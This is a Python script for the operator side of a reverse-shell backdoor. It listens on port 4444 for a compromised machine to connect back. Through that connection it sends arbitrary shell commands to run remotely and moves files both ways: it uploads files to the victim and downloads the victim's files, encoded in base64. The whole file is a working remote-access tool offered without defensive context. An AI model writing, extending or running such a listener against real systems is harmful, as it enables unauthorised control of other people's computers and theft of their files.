import socket

import json

import base64

import shlex

import sys



class Listener(object):

	def __init__(self,port):

		self.port = port

		self.addr = None

		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

		self.connection.bind(("", self.port))

		self.connection.listen(0)

		print(f"[+]Listening on port [{self.port}]")

		while True:

			try:

				self.connection,self.addr = self.connection.accept()

			except Exception:

				pass

			else:

				print(f"[+]Got a connection from  {self.addr[0]}")

				break

	

	def reliable_send(self,data):

		json_data = json.dumps(data)

		self.connection.send(json_data.encode())

	

	def execute_remotely(self, command):

		self.reliable_send(command)

		if command[0] == "exit":

			self.connection.close()

			sys.exit()

		return self.reliable_receive()

	

	def reliable_receive(self):

		json_data = b""

		while True:

			try:

				json_data += self.connection.recv(1024)

				return json.loads(json_data)

			except Exception:

				continue

			

	def write_file(self,path,content):

		with open(path,'wb') as file:

			file.write(base64.b64decode(content))

			return "[+] Download successful."

		

	

	def read_file(self,path):

		with open(path,'rb') as file:

			return base64.b64encode(file.read())

	def run(self):

		while True:

			command = input(">>")

			command = command.split(" ")

			#try:

			if command[0] == "upload":

				file_content = self.read_file(command[1])

				command.append(file_content.decode())

			elif command[0] == "cd" and len(command) > 2:

				command[1] = " ".join(command[1:])

			result = self.execute_remotely(command)

					

			if command[0] == "download" and "[-] Error " not in result:

				result = self.write_file(command[1], result)

			#except Exception:

				#result = "[-] Error during command execution."

			print(result)

		self.connection.close()

		print(f"[+]Aborting connection with {self.addr[0]}")

	

		



listener = Listener(4444)

listener.run()
